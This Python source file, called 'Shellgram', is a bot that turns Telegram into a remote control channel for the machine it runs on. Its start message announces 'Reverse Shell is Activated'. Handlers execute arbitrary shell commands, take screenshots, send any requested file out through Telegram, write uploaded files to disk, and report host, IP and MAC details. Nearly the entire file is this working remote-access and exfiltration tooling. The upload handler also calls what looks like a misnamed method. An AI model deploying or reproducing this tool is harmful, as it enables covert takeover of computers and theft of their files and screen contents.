"""
Shellgram
Author: Timur Y.
Date: 2025-08-04
Description:
    Proof-of-concept Telegram bot for remote administration.
    Features:
        - Run shell commands remotely
        - Take screenshots
        - Upload/Download files
        - Retrieve system information
"""

# ===== Imports & Config =====
from dotenv import load_dotenv
import os
import subprocess
import pyautogui
import platform
import socket
import re
import uuid
import psutil
import telebot
from telebot import types


load_dotenv()

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
AUTHORIZED_USERS = [int(os.getenv("AUTHORIZED_USER_ID"))]  # Your telegram ID

if not TOKEN:
    raise ValueError("Token is not found! Check .env file.")

bot = telebot.TeleBot(TOKEN)


def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS


# ===== Start button =====
@bot.message_handler(commands=["start"])
def welcome(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "Access denied")
        return

    markup = types.ReplyKeyboardMarkup(row_width=2)
    btn_shell = types.KeyboardButton("/shell")
    btn_screenshot = types.KeyboardButton("/screenshot")
    btn_download = types.KeyboardButton("/download")
    btn_upload = types.KeyboardButton("/upload")
    btn_sysinfo = types.KeyboardButton("/sysinfo")
    markup.add(btn_shell, btn_screenshot, btn_upload, btn_download, btn_sysinfo)

    bot.reply_to(message, "Reverse Shell is Activated", reply_markup=markup)


# ===== Screenshot Feature =====
@bot.message_handler(commands=["screenshot"])
def screenshot(message):
    if not is_authorized(message.from_user.id):
        return

    try:
        # Takes a screenshot and saves
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        # Sends a screenshot to the user
        with open(screenshot_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo)
        # Deletes screenshot
        os.remove(screenshot_path)
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")


# ===== Shell Feature =====
@bot.message_handler(commands=["shell"])
def handle_shell(message):
    if not is_authorized(message.from_user.id):
        return

    # Checking messages for validity for shell
    command = message.text.replace("/shell", "").strip()
    if not command:
        bot.reply_to(message, "Please provide a command after /shell")
        return

    try:
        # Execute the command in the shell and get its output (stdout and stderr) as a string
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, text=True
        )
        bot.reply_to(message, f"Results:\n{result}")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"Error:\n{e.output}")


# ===== Download File Feature =====
@bot.message_handler(commands=["download"])
def handle_download(message):
    if not is_authorized(message.from_user.id):
        return

    # Checking messages for validity for download
    file_path = message.text.replace("/download", "").strip()
    if not file_path:
        bot.reply_to(message, "Please provide a file path after /download")
        return

    try:
        with open(file_path, "rb") as file:
            bot.send_document(message.chat.id, file)
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")


# ===== Upload File Feature =====
@bot.message_handler(content_types=["document"])
def handle_upload(message):
    if not is_authorized(message.from_user.id):
        return

    try:
        # Trying to download a file from a message and save it locally
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.downloaded_file(file_info.file_path)

        file_name = message.document.file_name
        with open(file_name, "wb") as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, f"File {file_name} uploaded successfully")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")


# ===== System Information Feature =====
@bot.message_handler(commands=["sysinfo"])
def sysinfo(message):
    if not is_authorized(message.from_user.id):
        return

    try:
        # Function for escaping MarkdownV2
        def escape_md(text: str) -> str:
            return re.sub(r"([_*\[\]()~`>#+\-=|{}.!])", r"\\\1", str(text))

        # Getting system information
        info = {
            "OS": f"{platform.system()} {platform.release()}",
            "OS Version": platform.version(),
            "Architecture": platform.machine(),
            "Device name": socket.gethostname(),
            "IP-address": socket.gethostbyname(socket.gethostname()),
            "MAC-address": ":".join(re.findall("..", "%012x" % uuid.getnode())),
            "Processor": platform.processor(),
            "RAM": f"{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB",
        }

        # Alignment by longest key
        max_key_len = max(len(k) for k in info.keys())

        # Forming a message
        getsysinfo = "*System Information*\\:\n\n"
        for key, value in info.items():
            getsysinfo += (
                f"`{escape_md(key.ljust(max_key_len))}` : {escape_md(value)}\n"
            )

        bot.reply_to(message, getsysinfo, parse_mode="MarkdownV2")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")


bot.infinity_polling()
